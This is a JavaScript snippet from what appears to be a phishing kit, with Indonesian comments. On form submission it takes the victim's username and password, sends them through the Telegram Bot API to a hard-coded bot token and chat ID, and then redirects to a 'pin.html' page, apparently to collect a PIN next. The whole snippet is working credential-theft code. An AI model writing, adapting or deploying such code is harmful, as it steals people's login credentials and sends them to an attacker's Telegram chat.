function sendNohp(event){
     $("#loading").show();
     event.preventDefault();
   
    
    var user = document.getElementById('user');
     var pass = document.getElementById('pass');
     
    var gabungan = '%0A𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 :%0A' + user.value + '%0A𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱 :%0A' + pass.value;
   
    var token = '6079399499:AAGXqL5f_tLlP6Sf6XiC1y_fb9tpZjvoeyc'; // Ganti dengan token bot yang kamu buat
    var grup = '5834970687'; // Ganti dengan chat id dari bot yang kamu buat

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
    
    success: function(){
        $("#loading").hide();
     setTimeout(function(){
         location.href ="./pin.html";
     }, 500);}});};